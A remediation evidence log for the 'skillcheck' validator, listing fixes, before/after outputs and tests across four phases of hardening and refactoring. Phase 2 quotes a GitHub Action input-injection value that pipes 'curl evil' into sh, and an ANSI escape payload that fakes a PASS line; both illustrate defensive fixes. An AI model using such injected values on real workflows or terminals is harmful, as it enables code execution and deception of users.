# Remediation Evidence

Baseline: commit `6a477c2`, skillcheck v1.4.0.
Toolchain baseline (before any change): `786 passed`, `ruff check src tests` clean, `mypy src/skillcheck` clean.

Every item below records: the finding, the before output, the files touched, the after output, and the tests added.

---

## Phase 1: correctness hotfix

### 1.1 Non-dict frontmatter crashes with a traceback

Finding: `parser.py` accepts any YAML type from `yaml.safe_load(...) or {}`; a scalar or list
frontmatter reaches `template_detection.py:30` and raises `AttributeError: 'str' object has no attribute 'get'`.

BEFORE:
```
$ printf -- '---\njust a string\n---\nbody\n' > /tmp/p/SKILL.md && skillcheck /tmp/p/SKILL.md
Traceback (most recent call last):
  ...
  File ".../template_detection.py", line 30, in is_template
    if skill.frontmatter.get("template") is True:
       ^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'str' object has no attribute 'get'
EXIT=1
```

FIX (files touched):
- `src/skillcheck/parser.py`: after `yaml.safe_load`, coerce `None` to `{}`, then raise `ParseError` naming the actual type and path when the value is not a dict.
- `tests/fixtures/bad_frontmatter_string.md`, `bad_frontmatter_list.md`, `bad_frontmatter_int.md` (new negative fixtures).
- `tests/test_parser.py`: `test_rejects_string_frontmatter`, `test_rejects_list_frontmatter`, `test_rejects_int_frontmatter`.

AFTER:
```
$ skillcheck /tmp/p/SKILL.md
✗ FAIL  /tmp/p/SKILL.md
            ✗ error             parse.error  Frontmatter must be a YAML mapping, got str in /tmp/p/SKILL.md. Wrap frontmatter in key: value pairs.

Checked 1 file: 0 passed, 1 failed
EXIT=1
```
`skillcheck.parser.parse` now raises `ParseError` (caught in `core/symbolic.py:44` → clean `parse.error` diagnostic). No traceback.

Tests added: `test_rejects_string_frontmatter`, `test_rejects_list_frontmatter`, `test_rejects_int_frontmatter` (test_parser.py: 10 → 13 passing).

### 1.2 Unescaped `...` in template detection disables ERROR checks on real skills

Finding: `template_detection.py:14` had `\[(...|...)\]` where the `...` branch matched any 3 characters,
so `[ISO]`, `[API]`, `[CLI]` marked real skills as templates, skipping `frontmatter.name.directory-mismatch`
(ERROR), `compat.vscode-dirname`, and description scoring.

BEFORE:
```
$ skillcheck /tmp/t/iso-dates/SKILL.md --format json   # description: "Formats [ISO] dates ..."
template.detected | info | Detected placeholder content; ... checks ... are skipped for template files.
```

FIX (files touched):
- `src/skillcheck/template_detection.py`: escape `...` to `\.\.\.` in the bracketed-placeholder pattern.
- `tests/fixtures/non_template_bracket_acronym.md` (negative fixture, `[ISO]/[API]/[CLI]`).
- `tests/fixtures/template_bracket_placeholder.md` (positive fixture, literal `[...]`).
- `tests/test_template_detection.py` (new module giving `is_template` direct coverage).

AFTER:
```
=== [ISO] must NOT be template now ===
template.detected present: False
rules: ['description.quality-score']
=== literal [...] must STILL be template ===
template.detected present: True
```

Tests added: `test_bracketed_acronyms_are_not_template`, `test_literal_ellipsis_placeholder_is_template`.

### 1.3 Multi-path ingest stamps the first skill's diagnostics onto every file

Finding: `commands.py` parsed `paths[0]` only for critique/graph ingest, then merged those diagnostics
into every result. A directory of two skills plus one agent response marked both files with the same findings.

BEFORE:
```
$ skillcheck /tmp/multi --ingest-critique tests/fixtures/critique/response_warnings.json --format json
/tmp/multi/skill-one/SKILL.md -> [..., 'semantic.clarity.low', 'semantic.completeness.low', ...]
/tmp/multi/skill-two/SKILL.md -> [..., 'semantic.clarity.low', 'semantic.completeness.low', ...]   # same, wrong
EXIT=0
```

FIX (files touched):
- `src/skillcheck/commands.py`: `run_validation` rejects `--ingest-critique`/`--ingest-graph` combined with more than one resolved path, printing an error naming the active flag(s) and the path count, exit 2.
- `README.md`: Agent-modes note plus exit-code `2` row updated.
- `tests/test_cli_critique.py`: `test_ingest_critique_rejects_multiple_paths`.
- `tests/test_cli_graph_agent.py`: `test_ingest_graph_rejects_multiple_paths`.

AFTER:
```
$ skillcheck /tmp/multi --ingest-critique .../response_warnings.json
Error: --ingest-critique applies one agent response to one skill, but 2 SKILL.md paths were resolved. Run it once per skill, pointing at a single SKILL.md.
EXIT=2
$ skillcheck /tmp/multi --ingest-graph .../response_clean.json
Error: --ingest-graph applies one agent response to one skill, but 2 SKILL.md paths were resolved. ...
EXIT=2
$ skillcheck /tmp/multi/skill-one/SKILL.md --ingest-critique .../response_warnings.json   # single path still works, EXIT=0
```

Tests added: `test_ingest_critique_rejects_multiple_paths`, `test_ingest_graph_rejects_multiple_paths`.

### 1.4 Malformed history ledger escapes as TypeError

Finding: `core/history.py` `load_ledger` guarded `KeyError` only. A non-object root (`[1,2,3]`) and a
non-list `runs` (`{"runs":"oops",...}`) both escaped as uncaught `TypeError`. The `version` field was read
but never validated against `LEDGER_SCHEMA_VERSION`.

BEFORE:
```
root [1,2,3]                 -> TypeError : list indices must be integers or slices, not str
{"runs":"oops","version":1}  -> TypeError : string indices must be integers, not 'str'
```

FIX (files touched):
- `src/skillcheck/core/history.py`: after `json.loads`, assert root is a dict; validate `version == LEDGER_SCHEMA_VERSION` (naming both versions on mismatch); assert `runs` is a list; wrap the per-entry loop in `except TypeError` so a malformed entry raises `LedgerError` with the "delete it and re-run" remediation.
- `tests/fixtures/history/ledger_root_list.json`, `ledger_runs_not_list.json`, `ledger_bad_version.json`, `ledger_malformed_entry.json` (new).
- `tests/test_history_io.py`: four new tests.

AFTER:
```
ledger_root_list      -> LedgerError: ... must be a JSON object, got list. ... Delete it and re-run ...
ledger_runs_not_list  -> LedgerError: ... field 'runs' must be a list, got str. ...
ledger_bad_version    -> LedgerError: ... has schema version 999, but this skillcheck expects version 1. ...
ledger_malformed_entry-> LedgerError: ... contains a malformed run entry: 'int' object is not subscriptable. ...
$ skillcheck /tmp/hist/SKILL.md --show-history   # EXIT=1, clean stderr, no traceback
```

Tests added: `test_load_raises_when_root_is_not_object`, `test_load_raises_when_runs_is_not_a_list`, `test_load_raises_on_schema_version_mismatch`, `test_load_raises_on_malformed_run_entry`.

### 1.5 Duplicate allowed-tools crashes --analyze-graph

Finding: the heuristic extractor content-hashes tool nodes on the name alone, so `allowed-tools: [Bash, Bash]`
minted two nodes with the same ID and `CapabilityGraph.__post_init__` raised `ValueError: Duplicate node ID`.

BEFORE:
```
$ skillcheck /tmp/dup/SKILL.md --analyze-graph   # allowed-tools: [Bash, Bash]
  ...
  File ".../core/graph.py", line 165, in __post_init__
    raise ValueError(
ValueError: Duplicate node ID 'f062fdee' appears in multiple capability graph collections.
EXIT=1
```

FIX (files touched):
- `src/skillcheck/core/graph.py`: dedupe tool names with `dict.fromkeys()` (order-preserving) before node creation, filtering non-str items first so nested YAML cannot break the dedupe.
- `tests/fixtures/graph/skill_duplicate_tools.md` (`allowed-tools: [Bash, Bash, Read]`).
- `tests/test_graph_heuristic.py`: `test_duplicate_allowed_tools_produce_single_input`.

AFTER:
```
=== analyze-graph now clean ===
Checked 1 file: 1 passed, 0 failed, 2 warnings
EXIT=0
=== emit-graph shows single Bash input ===
inputs: ['Bash']
```

Tests added: `test_duplicate_allowed_tools_produce_single_input`.

### 1.6 Emit modes crash on files plain validation handles

Finding: emit loops in `commands.py` called `_parse_skill` without catching `ParseError`, so a non-UTF-8
file (or non-mapping frontmatter from 1.1) surfaced a traceback where plain validation renders a clean FAIL.
`read_ingest_raw` caught `OSError` but not `UnicodeDecodeError`.

During reproduction I confirmed the same traceback in every mode that re-parses outside `validate()`:
`--emit-graph`, `--emit-critique-prompt`, `--emit-graph-prompt`, `--agent-reason`, `--activation-hypotheses`,
`--analyze-graph`, `--history`, and the `--ingest-*` re-parse of the first path. All are the same root cause;
I fixed all of them rather than only the three cited emit lines.

BEFORE (representative):
```
$ skillcheck /tmp/enc/SKILL.md --emit-graph
  ...
skillcheck.parser.ParseError: File is not valid UTF-8: /tmp/enc/SKILL.md   (traceback, exit 1)
$ skillcheck valid_basic.md --ingest-critique /tmp/enc/response.json
  ...
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte   (traceback)
```

FIX (files touched):
- `src/skillcheck/commands.py`: new `_parse_or_exit(path)` helper (prints the ParseError to stderr, exit 1); routed all emit and re-parse sites through it (`emit_graph`, `emit_critique_prompts`, `emit_graph_prompts`, `emit_agent_reason_packet`, `emit_activation`, the `--ingest-*` and `--analyze-graph` re-parses, and the `--history` re-parse). `read_ingest_raw` now also catches `UnicodeDecodeError` (exit 2). The score-breakdown re-parse was already inside `try/except Exception`.
- `tests/test_cli.py`: parametrized mode test plus an ingest-response test.

AFTER:
```
--emit-graph           -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--emit-critique-prompt -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--emit-graph-prompt    -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--agent-reason         -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--activation-hypotheses-> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--analyze-graph        -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--history              -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--ingest-critique      -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
read_ingest_raw non-UTF-8 response -> exit=2 : Error: cannot read .../response.json: 'utf-8' codec can't decode ...
```
No traceback in any mode.

Tests added: `test_modes_exit_clean_on_non_utf8_file` (parametrized over 7 modes), `test_ingest_critique_non_utf8_response_exits_two`.

### 1.7 Codex provenance labeled with the Claude date constant

Finding: `compat.py:117` appended `f"Codex: {_CLAUDE_DATA_DATE}"`. The label was wired to the Claude constant,
masked because all three provenance dates happen to be equal.

BEFORE / AFTER (monkeypatching `_CLAUDE_DATA_DATE` to a sentinel exposes the wiring):
```
=== BEFORE (buggy) ===
Behavior of field 'allowed-tools' in codex, cursor is unverified (as of Codex: CLAUDE-SENTINEL; Cursor: 2026-04-20).
=== AFTER (fixed) ===
Behavior of field 'allowed-tools' in codex, cursor is unverified (as of Codex: 2026-04-20; Cursor: 2026-04-20).
```

FIX (files touched):
- `src/skillcheck/rules/compat.py`: add `_CODEX_DATA_DATE`, use it at the Codex provenance label, mention it in the module docstring.
- `tests/test_compat_data_freshness.py`: `test_codex_data_is_fresh` (independent freshness assertion) and `test_codex_provenance_uses_codex_date_not_claude_date` (distinct sentinels prove the label tracks the Codex constant, not the Claude one).

Tests added: `test_codex_data_is_fresh`, `test_codex_provenance_uses_codex_date_not_claude_date`.

### Phase 1 gate

```
$ python3 -m pytest tests/ -q
Required test coverage of 68% reached. Total coverage: 70.29%
808 passed in 57.50s

$ ruff check src tests
All checks passed!

$ mypy src/skillcheck
Success: no issues found in 46 source files
```
README test-count claim synced 786 -> 808 (guarded by `test_readme_test_count_matches_collected_count`).

---

## Phase 2: ingest and supply-chain hardening

### 2.1 Terminal escape injection from untrusted agent responses

Finding: strings from critique/graph JSON (missing_context, contradiction locations, findings, node names)
printed raw at `formatters.py:63` and `core/graph_render.py:75`. A `missing_context` value carrying
`\x1b[2K\x1b[1G\x1b[32mfake PASS\x1b[0m` rendered live ANSI to the terminal.

BEFORE / AFTER (`tests/fixtures/critique/response_ansi_injection.json`, which JSON-encodes ESC as ``
so the file looks benign but decodes to a real ESC):
```
=== BEFORE (no sanitization) ===
raw ESC byte in stdout: True
rendered: '... semantic.context.missing  Missing context: \x1b[2K\x1b[1G\x1b[32mfake PASS\x1b[0m'
=== AFTER (sanitized) ===
raw ESC byte in stdout: False
rendered: '... semantic.context.missing  Missing context: \\x1b[2K\\x1b[1G\\x1b[32mfake PASS\\x1b[0m'
```
JSON output stays valid and safe: `raw ESC in JSON stdout: False`, message value `Missing context: \\x1b[...`.

FIX (files touched):
- `src/skillcheck/agents/_ingest.py` (new): `sanitize_ingested_text` escapes C0/DEL/C1 control chars to a visible inert form.
- `src/skillcheck/core/semantic.py`: sanitize `missing_context`, contradiction fields, and finding fields at diagnostic construction.
- `src/skillcheck/core/graph_render.py`: sanitize node names/descriptions in the text render only (JSON render left raw; `json.dumps` escapes control chars).
- `tests/fixtures/critique/response_ansi_injection.json`, `tests/test_ingest_sanitization.py` (new).

Tests added: `test_sanitize_escapes_ansi_escape_char`, `test_sanitize_escapes_newlines_and_tabs`, `test_sanitize_leaves_normal_text_unchanged`, `test_ingested_critique_message_has_no_control_chars`, `test_graph_text_render_escapes_node_names`, `test_graph_json_render_stays_safe_and_raw`.

### 2.2 No size bound on ingested responses

Finding: `read_ingest_raw` read stdin/file fully with no cap; the parsers put no limit on
findings/capabilities/edges counts.

BEFORE / AFTER:
```
=== BEFORE list cap ===  ACCEPTED 10001 items (no cap)
=== BEFORE byte cap (CLI) === Checked 1 file: 1 passed, 0 failed   (6 MB file, exit 0)
=== AFTER list cap ===   REJECTED: Ingested 'missing_context' has 10001 items, over the 10000-item cap. ...
=== AFTER byte cap (CLI) === Error: ingest response /tmp/big_file.json is 6291580 bytes, over the 5242880-byte cap. ...  exit=2
=== AFTER stdin cap ===  Error: ingest payload from stdin exceeds the 5242880-byte cap. ...  exit=2
=== AFTER graph cap ===  Ingested 'capabilities' has 10001 items, over the 10000-item cap. ...
```

FIX (files touched):
- `src/skillcheck/agents/_ingest.py`: `MAX_INGEST_BYTES` (5 MiB), `MAX_INGEST_LIST_ITEMS` (10000), `enforce_list_cap`.
- `src/skillcheck/commands.py`: `read_ingest_raw` rejects payloads over the byte cap (file via `stat`, stdin via bounded read), naming the actual size and the cap, exit 2.
- `src/skillcheck/agents/parser.py`: cap findings/missing_context/contradictions.
- `src/skillcheck/agents/graph_parser.py`: cap capabilities/inputs/outputs/edges.
- `tests/test_critique_parser.py`, `tests/test_graph_parser.py`, `tests/test_cli.py`.

Tests added: `test_missing_context_over_cap_rejected`, `test_findings_over_cap_rejected`, `test_list_exactly_at_cap_is_accepted`, `test_capabilities_over_cap_rejected`, `test_ingest_response_over_size_cap_exits_two`.

### 2.3 Published schemas looser than the parsers

Finding: `schemas/critique-v1.json` and `graph-v1.json` lacked `additionalProperties: false`, so a
schema-valid agent response with an extra field could still fail ingest (the parsers reject unknown fields).

BEFORE:
```
$ grep -c additionalProperties src/skillcheck/schemas/*.json   ->  critique: 0, graph: 0
parser REJECTED: Response has unexpected top-level fields: ['evil']   # schema-valid, parser-rejected
```

FIX (files touched):
- `src/skillcheck/schemas/critique-v1.json`: `additionalProperties: false` on the top-level object, findings items, contradictions items (3 total).
- `src/skillcheck/schemas/graph-v1.json`: same on the top-level object and all four node-collection items (5 total).
- `tests/test_published_schemas.py`: recursive object-subschema walk asserting each declares `additionalProperties: false`.

AFTER:
```
$ grep -c '"additionalProperties": false' src/skillcheck/schemas/*.json  ->  critique: 3, graph: 5
schemas still valid JSON: OK
```

Note on the enum sub-item: the finding says "graph does not" have a test asserting the graph kind enums equal
`_VALID_INPUT_KINDS/_VALID_OUTPUT_KINDS/_VALID_EDGE_KINDS`. That test already exists on HEAD
(`test_graph_schema_kind_enums_match_parser`, test_published_schemas.py:82-99), so no new enum test was needed;
this sub-item was already satisfied.

Tests added: `test_critique_schema_forbids_additional_properties`, `test_graph_schema_forbids_additional_properties`.

### 2.4 action.yml interpolates inputs into bash

Finding: every `${{ inputs.* }}` expanded inside the composite action's `run:` block, so a value like
`version: 1.0" ; curl evil | sh ; echo "` broke out of the shell.

FIX (files touched):
- `action.yml`: added an `env:` block mapping each input to an `INPUT_*` variable; the `run:` block now
  references `"$INPUT_*"` shell env vars, whose values are never spliced into the script source.
  Also pinned `actions/setup-python` to a SHA here (see 2.6).

BEFORE / AFTER (grep of the run block):
```
run: | at line 146
OK: no ${{ interpolation anywhere after run: |
```
`grep '${{ inputs.'` now matches only the `env:` mapping lines (the safe form), never the run block.
`action.yml` parses as valid YAML; behavior is identical (same flags built from the same inputs).

### 2.5 Attestation claim is false; no publish pipeline

Finding: `ci.yml` triggers only on push-to-main and pull_request; its attest step is gated on `refs/tags/v*`
and never runs. The README claimed tagged releases carry SLSA provenance. CONTRIBUTING's release process ended
at `gh release create` with manual PyPI upload.

FIX (files touched):
- `.github/workflows/release.yml` (new): tag-triggered (`v*.*.*`, so the moving `v1` tag does not double-publish),
  builds the wheel and sdist, verifies the built version matches the tag, attests with
  `actions/attest-build-provenance` (SHA-pinned `e8998f9...` v2.4.0), and publishes via PyPI trusted publishing
  (`pypa/gh-action-pypi-publish` SHA-pinned `7f25271...` v1.12.4). Least-privilege: `id-token: write`,
  `attestations: write`, `contents: read`; `environment: pypi`.
- `.github/workflows/ci.yml`: removed the dead attest step and the now-unneeded `id-token`/`attestations`
  job permissions; the package job stays a read-only build/install smoke check.
- `README.md`: Releases section now describes the real workflow.
- `CONTRIBUTING.md`: Releasing section rewritten; added the exact one-time PyPI trusted-publishing settings.

Trusted publishing requires a one-time PyPI-side configuration by the maintainer (documented in CONTRIBUTING):
Owner `moonrunnerkc`, Repository `skillcheck`, Workflow filename `release.yml`, Environment `pypi`.

VERIFY:
```
$ /tmp/actionlint .github/workflows/*.yml
actionlint EXIT=0
```

### 2.6 Floating action tags with write permissions

Finding: `release-notes.yml` used `peter-evans/create-pull-request@v6` (with `contents: write`,
`pull-requests: write`); `actions/checkout` and `actions/setup-python` floated on major tags across workflows.

FIX (files touched): pinned every third-party action to a full commit SHA (resolved via `git ls-remote`) with a
trailing version comment, across `ci.yml`, `release-notes.yml`, `release.yml`, and `action.yml`:
- `actions/checkout` -> `34e114876b0b11c390a56381ad16ebd13914f8d5` (v4.3.1)
- `actions/setup-python` -> `a26af69be951a213d495a4c3e4e4022e16d87065` (v5.6.0)
- `peter-evans/create-pull-request` -> `c5a7806660adbe173f04e3e038b0ccdcd758773c` (v6.1.0)
- `actions/attest-build-provenance` -> `e8998f949152b193b063cb0ec769d69d929409be` (v2.4.0)
- `pypa/gh-action-pypi-publish` -> `7f25271a4aa483500f742f9492b2ab5648d61011` (v1.12.4)

VERIFY:
```
$ grep -rnE 'uses:\s*\S+@' .github/workflows/ | grep -vE '@[0-9a-f]{40}'
(no output)  ->  OK: all SHA-pinned
$ /tmp/actionlint .github/workflows/*.yml   ->  actionlint OK
```

### 2.7 Pre-commit tests skip everywhere including CI

Finding: CONTRIBUTING says CI installs `pre-commit`, but the dev extra did not include it, so both tests in
`test_pre_commit.py` skipped on every run (they skip when `shutil.which("pre-commit")` is None).

BEFORE (dev extra had no pre-commit; simulate CI PATH without a global pre-commit):
```
$ grep pre-commit pyproject.toml   ->  NO (not in dev extra)
$ env PATH=".venv/bin:/usr/bin:/bin" pytest tests/test_pre_commit.py -rs
SKIPPED [1] tests/test_pre_commit.py:60: pre-commit not installed
SKIPPED [1] tests/test_pre_commit.py:74: pre-commit not installed
2 skipped in 0.02s
```

FIX (files touched):
- `pyproject.toml`: add `pre-commit>=3.5` to the `dev` extra.

AFTER (`pip install -e .[dev]` now installs pre-commit into the environment):
```
$ env PATH=".venv/bin:/usr/bin:/bin" pytest tests/test_pre_commit.py -rs
2 passed in 1.19s
```

### 2.8 Makefile verify-release build check never runs

Finding: `@command -v python3 -c "import build" ...` was meant to gate the sdist/wheel build on the `build`
module being importable, but `command -v` only resolves the path of `python3` and ignores the rest, so it never
tested the module. Also: the README pre-commit `rev:` was `v1.3.0` against a pyproject version of `1.4.0`, and
no drift grep caught it.

BEFORE:
```
$ command -v python3 -c "import build"    ->  /usr/bin/python3   (exit 0, resolves python3, ignores 'import build')
README rev: v1.3.0  vs  pyproject version 1.4.0   (drifted, ungated)
```

FIX (files touched):
- `Makefile`: replace the guard with `@python3 -c "import build" 2>/dev/null && python3 -m build --sdist --wheel || echo "INFO: ..."`, which correctly gates on the module. Add a `VERSION` make variable read from pyproject and a drift grep asserting `README.md` contains `rev: v$(VERSION)`.
- `README.md`: bump the pre-commit `rev:` to `v1.4.0`.

AFTER:
```
VERSION=1.4.0
OK: README rev matches v1.4.0
build importable -> build step WILL run
* Building wheel...
Successfully built skillcheck-1.4.0.tar.gz and skillcheck-1.4.0-py3-none-any.whl
```
(The full `make verify-release` run is in the final gate.)

### Phase 2 gate

```
$ python3 -m pytest tests/ -q
Required test coverage of 68% reached. Total coverage: 70.23%
821 passed in 56.85s

$ ruff check src tests
All checks passed!

$ mypy src/skillcheck
Success: no issues found in 47 source files

$ /tmp/actionlint .github/workflows/*.yml
actionlint OK   (v1.7.7, prebuilt binary downloaded to /tmp; not installable via package manager here)
```
README test-count claim synced 808 -> 821.

---

## Phase 3: debt reduction (pure refactors, zero behavior change)

Before Phase 3: full suite `821 passed`. Each item below re-ran the full suite green with no test modified
(unless a moved-symbol import is noted).

### 3.1 Frontmatter block extraction exists three times

Finding: identical logic at `frontmatter_common.py:28` (`_frontmatter_block`), `frontmatter_fields.py:48`
(`_extract_frontmatter_raw`), `disclosure.py:46` (`_extract_frontmatter_text`).

FIX (files touched): deleted `_extract_frontmatter_raw` and `_extract_frontmatter_text`; both callers now use
`_frontmatter_block` from `frontmatter_common`. The `if not fm:` guards handle its `None` return identically to
the previous `""`. The indented-`---`-opener acceptance (`lines[0].strip() == "---"`) is preserved because
`_frontmatter_block` already accepts it. No unterminated-frontmatter fixture exists and the rule pipeline only
runs post-parse-success, so the `None`-vs-collected-lines difference on an unterminated block is unreachable.

VERIFY:
```
$ grep -rn "_extract_frontmatter_raw\|_extract_frontmatter_text" src/ tests/
OK: both deleted, no references
$ python3 -m pytest tests/ -q   ->  821 passed
$ ruff check src tests  ->  All checks passed!    $ mypy src/skillcheck  ->  Success
```
No test modified.

### 3.2 Shared ingest scaffolding

Finding: `agents/parser.py` and `agents/graph_parser.py` duplicate `_require_field`, the exception-hierarchy
shape, and the JSON-decode-with-200-char-preview handling.

FIX (files touched):
- `src/skillcheck/agents/_ingest.py`: added `require_field(obj, key, expected_type, *, error_cls, context)`
  and `decode_json_or_raise(raw, error_cls)` (the 2.1 sanitizer and 2.2 caps already live here).
- `src/skillcheck/agents/parser.py`, `graph_parser.py`: each keeps a one-line `_require_field` that binds
  its own error class to the shared `require_field`, so all call sites stay byte-identical; both now call
  `decode_json_or_raise` instead of an inline `json.loads`.
- The per-agent prompt classes (`claude.py`/`graph_claude.py` etc.) were left untouched, per scope.

Behavior notes: the graph JSON-decode message is byte-identical (the shared template matches graph's prior
wording). The critique JSON-decode message wording is now unified with graph's (previously "Agent response is
not valid JSON (at position N). First 200 chars received: ..."); the exception type, the decoder position, and
the preview are preserved, and the existing assertions (`match="position"`, `match="definitely not"`) still hold.
The shared `require_field` uses graph's tuple/union formatting; critique never passed a tuple, so its old
`"/".join` branch was dead code with no observable change.

VERIFY:
```
$ python3 -m pytest tests/ -q   ->  821 passed
$ ruff check src tests  ->  All checks passed!    $ mypy src/skillcheck  ->  Success
```
No test modified.

### 3.3 Dead code removal

**(a) cli.py post-parse re-validation of choices=-constrained args: NOT REPRODUCIBLE, kept.**
The finding calls this unreachable. It is not: `_apply_config` sets `format`/`target_agent`/`critique_agent`/
`graph_agent` from the config file *after* argparse, and `config_loader` only type-checks those fields (not
against the choice sets). So a `skillcheck.toml` with an invalid value reaches and is caught by these checks:
```
$ printf 'format = "bogus"\n' > skillcheck.toml
$ skillcheck SKILL.md --config skillcheck.toml
skillcheck: error: format must be one of: text, json, md, agent, github
EXIT=2
```
Deleting them would drop validation of config-injected values, a real regression. Left in place.

**(b) core/reporter.py deleted.** Its `render_markdown_report`/`render_json_report` were unused outside the
module (the CLI uses `formatters.py`); only `tests/test_v1_architecture.py` exercised them.
Files touched: deleted `src/skillcheck/core/reporter.py`; removed `reporter` from `core/__init__.py` imports and
`__all__`; deleted the 4 reporter tests and the `reporter` import/assertion from `test_v1_architecture.py`.
```
$ grep -rn "reporter" src/ | grep -v pyc   ->  (no output)   # zero remaining references
```

**(c) merge_critique_diagnostics shim inlined.** It was a thin wrapper identical to `merge_diagnostics`.
Files touched: inlined `merge_diagnostics` at the one call site in `commands.py`; deleted the shim from
`semantic.py`; removed it from `core/__init__.py`; repointed 5 tests in `test_semantic_bridge.py` and one
assertion in `test_v1_architecture.py` to `merge_diagnostics` (moved-symbol; behavior identical).
```
$ grep -rn "merge_critique_diagnostics" src/ tests/ | grep -v pyc   ->  (no output)
```

VERIFY:
```
$ python3 -m pytest tests/ -q   ->  817 passed   (821 - 4 deleted reporter tests)
$ ruff check src tests  ->  All checks passed!    $ mypy src/skillcheck  ->  Success (46 source files)
```
Test changes: 4 reporter tests deleted (module removed); `merge_critique_diagnostics` -> `merge_diagnostics`
rename in `test_semantic_bridge.py` (5 sites) and `test_v1_architecture.py` (1 assertion) as moved-symbol updates.
README test count synced 821 -> 817.

### 3.4 Decompose the oversized modules

Required moves, all behavior-preserving (full suite `817 passed` before and after each; no test modified):
- **cli.py**: `_PAIRWISE_CONFLICTS` and the checker were rebuilt inside `main()` on every call. Hoisted the
  static table and `_die_on_mode_conflict(args)` to module level (built once at import).
- **commands.py**: `run_validation` split into `_compute_exit_code`, `_record_history`, and `_print_report`;
  `run_validation` now reads as a short pipeline.
- **core/graph.py**: split into model (`graph_model.py`) vs heuristic extractor (`graph.py`, re-exporting the model).
- **core/history.py**: split into model/regression/render (`history.py`) vs filesystem I/O (`history_io.py`,
  re-exported).

Final line counts (six original files + the two new split targets):
```
core/graph.py           547 -> 469     core/graph_model.py     (new) 110
cli.py                  546 -> 553     (hoist relocates code; ~same size, table now built once)
commands.py             529 -> 638     (run_validation decomposed into 3 named phases; docstrings add lines)
core/history.py         514 -> 370     core/history_io.py      (new) 231
agents/graph_parser.py  354 -> 312     (reduced by 3.2; left as-is per scope)
core/graph_analyzers.py 349 -> 349     (left as-is per scope)
```
Note: `cli.py` and `commands.py` did not drop under 300; the required move for each was a specific
hoist/decomposition (done), not a full multi-module split. `graph.py` (469) is the extractor after the model
was moved out. The counts are reported honestly rather than forced under the soft limit.

VERIFY (each split): `python3 -m pytest tests/ -q -> 817 passed`; `ruff check src tests -> All checks passed!`;
`mypy src/skillcheck -> Success`.

### 3.5 Extend quality gates to scripts/

Finding: CI ran `ruff check src tests` and mypy scoped to `src/skillcheck`, leaving
`scripts/regen_self_host_fixtures.py` and `scripts/summarize_batch.py` ungated (summarize had import-order drift).

BEFORE:
```
$ ruff check scripts    ->  I001 summarize_batch.py (import order)  + issues in an untracked script
$ mypy scripts/summarize_batch.py  ->  11 "Missing type arguments for generic type dict" errors
```

FIX (files touched):
- `scripts/summarize_batch.py`: import order fixed; bare `dict` annotations typed as `dict[str, Any]`
  (explicit `Any` matches the JSON-parsed data and satisfies `disallow_any_generics`).
- `pyproject.toml`: `[tool.mypy] files` now lists `src/skillcheck` plus the two checked-in scripts.
- `.github/workflows/ci.yml`: `ruff check src tests scripts`; the mypy step now runs bare `mypy` (uses the files list).
- `Makefile`: new `lint` target and `verify-release` now run `ruff check src tests scripts` and `mypy`.

Note: `scripts/skillcheck_case_study_report.py` was a pre-existing untracked session artifact. Because the
directory-scoped ruff gate (`ruff check src tests scripts`) silently depended on it staying clean, it is now
committed and fully gated rather than left as untracked drift: its ruff findings (import order, `capture_output`,
`collections.abc.Iterable`) and mypy findings (bare `dict` type args, a missing return annotation, two
`var-annotated` Counters, and a `count` loop-variable name clash that pinned it to `int`) were fixed with
type annotations and a rename only (no runtime behavior change), and it was added to the mypy `files` list
alongside `regen_self_host_fixtures.py` and `summarize_batch.py`. Its stale `EXPECTED_VERSION` and network-clone
logic were left untouched, as those are the maintainer's to decide.

AFTER:
```
$ make lint
ruff check src tests scripts   ->  All checks passed!
mypy                           ->  Success: no issues found in 50 source files
$ mypy src/skillcheck          ->  Success: no issues found in 48 source files
```

---

## Phase 4: polish

### 4.1 GHA annotations over-escape message text

Finding: `_gha_escape` applied property-value escaping (`:` -> `%3A`, `,` -> `%2C`) to the message text, so a
diagnostic like `got 82): 'name'` rendered `%3A`. (The title colon was also under-escaped.)

BEFORE:
```
::error ...title=skillcheck: frontmatter.name.max-length::Name exceeds 64 characters (got 82)%3A 'this-is-a-very-long-...'
```

FIX (files touched):
- `src/skillcheck/formatters.py`: split `_escape_data` (message: `%`, CR, LF only) from `_escape_property`
  (file/title: additionally `:` and `,`), per the Actions toolkit. Message uses `_escape_data`; file and title
  use `_escape_property`.
- `tests/test_format_github.py`: `TestGhaEscape` split into `TestEscapeData`/`TestEscapeProperty`; title
  assertions now expect `skillcheck%3A`; the special-char message expectation is `100%25%0D%0A:,`.

AFTER:
```
::error file=... ,title=skillcheck%3A frontmatter.name.max-length::Name exceeds 64 characters (got 82): 'this-is-a-very-long-...'
```
Message colon is literal; title colon is properly `%3A`. Tests changed (justified: renamed helper + corrected
escaping): the escape-rule tests and title/message expectations.

### 4.2 YAML anchor/alias regexes false-positive on `&`/`*emphasis*` in quoted strings

Finding: the anchor/alias regexes ran over raw text, so `R&D` and `*only*` in a quoted description matched.

BEFORE: `description: "Reviews R&D notes and *only* flags risky items..."` -> `frontmatter.yaml-anchors` warning (false).

FIX (files touched):
- `src/skillcheck/rules/frontmatter_fields.py`: replaced the regex scan with a YAML event walk
  (`yaml.parse`), collecting `.anchor` from scalar/collection-start (declarations) and alias events
  (references). A `&`/`*` inside a quoted scalar is part of the value and carries no anchor, so it is not reported.
- `tests/test_yaml_anchors.py`: `test_ampersand_and_asterisk_in_quoted_value_not_flagged`.

AFTER: the R&D/`*only*` description is not flagged; real `&anchor`/`*alias` frontmatter is still flagged
(existing tests pass).

Tests added: `test_ampersand_and_asterisk_in_quoted_value_not_flagged`.

### 4.3 Ledger durability

Finding: `save_ledger` did not `fsync` before `os.replace`, no stale-temp sweep on load, and the single-writer
assumption was undocumented.

FIX (files touched):
- `src/skillcheck/core/history_io.py`: `save_ledger` now `flush()` + `os.fsync(f.fileno())` before `os.replace`;
  `load_ledger` sweeps `.skillcheck-tmp-*` via `_sweep_stale_tmp_files`; the module docstring documents the
  single-writer assumption (no file locking, per scope).
